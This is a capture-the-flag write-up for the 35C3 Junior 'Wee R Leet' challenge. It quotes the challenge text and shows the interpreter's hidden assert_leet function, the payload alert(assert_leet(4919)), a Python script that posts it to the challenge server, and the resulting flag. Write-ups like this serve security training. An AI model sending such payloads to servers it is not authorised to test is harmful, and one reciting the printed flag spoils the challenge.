# 35C3 Junior CTF – Wee R Leet

* **Category:** Misc
* **Points:** variable

## Challenge

> Somebody forgot a useless assert function in the interpreter somewhere. In our agile development lifecycle somebody added the function early on to prove it's possible. Wev've only heared stories but apparently you can trigger it from Wee and it behaves differently for some "leet" input(?) What a joker. We will address this issue over the next few sprints. Hopefully it doesn't do any harm in the meantime.
>
> http://35.207.189.79/
>
> Difficulty estimate: Easy
>
> ===============================================
>
> Good coders should learn one new language every year.
>
> InfoSec folks are even used to learn one new language for every new problem they face (YMMV).
>
> If you have not picked up a new challenge in 2018, you're in for a treat.
>
> We took the new and upcoming Wee programming language from paperbots.io. Big shout-out to Mario Zechner (@badlogicgames) at this point.
>
> Some cool Projects can be created in Wee, like: this, this and that.
>
> Since we already know Java, though, we ported the server (Server.java and Paperbots.java) to Python (WIP) and constantly add awesome functionality. Get the new open-sourced server at /pyserver/server.py.
>
> Anything unrelated to the new server is left unchanged from commit dd059961cbc2b551f81afce6a6177fcf61133292 at badlogics paperbot github (mirrored up to this commit here).
>
> We even added new features to this better server, like server-side Wee evaluation!
>
> To make server-side Wee the language of the future, we already implemented awesome runtime functions. To make sure our VM is 100% safe and secure, there are also assertion functions in server-side Wee that you don't have to be concerned about.

## Solution

The *Wee* interpreter source code can be found here: `http://35.207.189.79/weelang/weeterpreter.ts`.

The endpoint that can be used to run *Wee* code is the following.

```
http://35.207.189.79/wee/run
```

The assertion that must be exploited is the following.

```Typescript
externals.addFunction(
   "assert_leet",
   [{name: "maybe_leet", type: compiler.NumberType}], compiler.StringType,
   false,
   (maybe_leet: number) => maybe_leet !== 0x1337 ? "WEE AIN'T LEET" : flags.WEE_R_LEET
)
```

`0x1337` is `4919` in decimal. Hence, payload is the following.

```
alert(assert_leet(4919))
```

The following Python script can be used to send the payload.

```Python
import requests
import json

url = "http://35.207.189.79/wee/run"
data_structure = """{{ "code": {} }}"""
data_content = """alert(assert_leet(4919))"""

data_content_to_send = json.dumps(data_content)
data_to_send = data_structure.format(data_content_to_send)
print "[*] Payload: '{}'.".format(data_to_send)
response = requests.post(url, data=data_to_send)
print "[*] Response: '{}'.".format(response.text)
```

The flag is the following.

```
35C3_HELLO_WEE_LI77LE_WORLD
```